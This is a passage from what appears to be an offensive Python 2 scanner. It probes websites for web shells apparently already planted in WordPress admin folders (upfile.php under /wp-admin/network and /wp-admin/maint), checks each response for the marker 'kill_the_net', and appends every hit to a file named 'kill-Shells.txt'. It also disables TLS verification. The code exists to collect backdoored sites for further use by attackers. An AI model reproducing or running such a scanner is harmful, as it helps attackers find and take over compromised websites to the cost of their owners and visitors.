...
def FourHundredThree(url):
    try:
        ...
        check = requests.get(url+'/wp-admin/network/upfile.php',headers=headers, allow_redirects=True,timeout=15)
        if 'kill_the_net' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('kill-Shells.txt', 'a').write(url + '/wp-admin/network/upfile.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/maint/upfile.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'kill_the_net' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('kill-Shells.txt', 'a').write(url + '/wp-admin/maint/upfile.php')
            else:
